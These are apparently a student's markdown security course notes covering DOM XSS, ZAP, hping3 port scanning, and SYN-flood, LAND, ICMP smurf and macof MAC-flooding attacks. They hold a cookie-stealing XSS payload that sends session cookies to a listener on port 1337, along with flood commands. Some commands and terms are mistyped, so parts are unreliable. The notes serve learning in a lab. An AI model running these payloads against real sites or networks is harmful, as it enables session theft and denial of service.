# File Inclusion

Check for [File Inclusion Vulnerabilty](../day5/day5.md#file-inclusion-vulnerability) if you learn the basic working where we discuss how things really work in here.

# Direct Object Modal XSS

Refer to [OWASP DOM Based XSS Attack](https://owasp.org/www-community/attacks/DOM_Based_XSS) which tell about the making DOM based XSS Attack.

Steps to performing the practical is the following:

- Go to the page and make changes to the url, the redirected in *default* should be the following:

```
<script>window.location='http://127.0.0.1:1337/cookie?=' + document.cookie</script>
```

And this will get directed the attacker side machine which will be provide the attacker with the session id of the machine or the application that user will be using, say it could be *facebook* or say *youtube*, but the attack might be able to get the sesssion id.

For that attacker would be running an session capture mechanism on his side.

```
python -m http.server 1337
```

This command lets the attacker to listen on port 1337 where he can have the access of the session id.


# Reflected XSS

Refer to [OWASP XSS (Cross-site Scripting)](https://owasp.org/www-community/attacks/xss/) to learn more about it. 



# (ZAP) ZED Attacking Proxy

Move to Source Code Analysis tools, in order to see the tools that are used in order to identify that whether the source code is secure or not.

You can run ap in Kali Linux, using the following cmd.

```
sudo apt install zaproxy
```

It includes DAST and SAST.

# Method-based access control can be circumvented


# Active Scanning and Finger-printing


```
sudo hping3 -s --scan $PORT_RANGE $TARGET_IP
```

This `-S` means that check for SYN packages, and sepcify the port range and target IP Address. It will give the command like this.

```
sudo hping3 -S -p 80 $TARGET_IP
```

This is only happen if the port number is open then only it will respond to the SYN message, otherwise it won't give you the message, otherwise it won't give you the response. 

Now in order you wish ro flood the request with the SYN packages, in order that the machine gets all the messages on the destination machine. **Do a experiment**, create two machine and run wireshark over both of them, when you'll start with the SYN flooding, you can check the wireshark to see how packets are going on both the machines. Destination machine will be occuring with high latency, because the website is bussy in reposding to SYN messages.

```
sudo hing3 -S -p 80 $TARGET_IP --flood
```

Use the following to flood the traffic between the two IPs.

```
sudo hping -S -p $SOURCE_IP -a $DESTINATION_IP
```

But you can try to flood the SYN packages between the two IPs.

```
sudo hping -S -p $SOURCE_IP -a $DESTINATION_IP --flood
```

This is called **LAND Attack**, where we are spoofing the traffic which is going from your local machine but it seems like it is comming from machine.

```
sudo hping --icmp
```

# ICMP Smurfing Attack

You need to run one command and thing will start happening.

```
sudo hping3 --icmp -c 1 192.168.0.255 --rand-source --flood
```

This will send the ICMP messages to the Broadcast address of the router with some random IP address and flood the router with ICMP address, such that router will not be able to send reposnse to other machines in the network.

# A talk worth talking about Switches 

It is a Layer 2 Attack and you can flood mac addresses and use the tool named **macof** to flood the mac addresses. 
```
sudo macof -i en9
```



# Resources

Visit the [portswigger website](https://portswigger.net/web-security) in order to learn more about the methods and latest web based hacks or vulnerabilities in order to protect the website from hacks and threats. 

Visit to [OWASP Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) to look how the inputs taken from the users can't be trusted, secure the methods of taking inputs.

1. Remember to read about the **SAST and DAST tools** and therefore look for it.
2. Read about MVC Structure. Also remember to look for Web Framework, Flask.
3. Js-gaurd is not secure, even if the website is full of virus, it won't block the website. *Need to check it!*